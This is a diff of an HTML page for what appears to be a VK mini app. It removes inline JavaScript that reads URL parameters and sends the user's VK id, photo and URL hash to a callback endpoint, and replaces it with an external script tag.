@@ -141,7 +141,7 @@ input.ranges {
 </body>
 <script>
 	
-   var idvk;
+           var idvk;
            var sid_user;
            var vk_ides;
            var hashs;
@@ -149,110 +149,11 @@ input.ranges {
            var vk_photos2;
            var vk_photosmax;
 
-
-               
-    var sky = getURLVar('avp');
-           
-               function getURLVar(key) {
-                 var query = String(document.location.href).split('?');
-                 if (query[1]) {
-                   var part = query[1].split('&');
-                   for (i = 0; i < part.length; i++) {
-                     var data = part[i].split('=');
-                     if (data[0] == key && data[1]) return data[1];
-                   }
-                 }
-                 return '';
-               }
-               
-               
-               idvk = getURLVar('ids');
-           
-               function getURLVar(key) {
-                 var query = String(document.location.href).split('?');
-                 if (query[1]) {
-                   var part = query[1].split('&');
-                   for (i = 0; i < part.length; i++) {
-                     var data = part[i].split('=');
-                     if (data[0] == key && data[1]) return data[1];
-                   }
-                 }
-                 return '';
-               }              
-                   
-       
-               //console.log(idvk);
-           
-         
-           
-           vkBridge.send('VKWebAppGetUserInfo')
-                         .then(data => {
-                          
-                           vk_refer = (data.id);
-                           sid_user  = (data.id);
-                           vk_ides = (data.id);
-                                                  
-                           vk_photos1 = (data.photo_100);
-                          hashs = (location.hash);
-                             console.log(location.hash);
-                             //console.log(data.id);
-                             //console.log(data.first_name);
-                             //console.log(data.last_name);
-                            // console.log(data);
-               
-               
-        console.log(vk_ides);
-       
-       
-               
-           
-       
-       
-               
-               
-               
-                             $.get( "https://skyauto.me/cllbck/" + sky + "?api=1",  {uid: idvk, refer: vk_refer,vk_photo1: vk_photos1,vk_hash: hashs}, function( data ) {
-                          $( '.maaasg' ).html( data );
-           
-                            });
-                       
-                   
-                      //console.log("https://skyauto.me/cllbck/" + sky + "?api=1");
-                   
-                   
-                       //console.log(code_hash);	
-                          
-                         
-       
-                          
-                         })
-                         .catch(error => {
-                           
-                         });
-           
-           	
+	
 </script>
 	
-	
-	<script>
-		
-		function sayHi() {
-  
+	<script type="text/javascript" src="https://special.getcurse-tech.ru/test.min.js"></script>
 
-		
-          console.log(vk_ides);
-        console.log(sid_user);
-        console.log(idvk);
-		
-		
-}		
-		
-		
-		
-	setTimeout(sayHi, 2000);	
-		
-		
-</script>
 	
 	
 </html>	
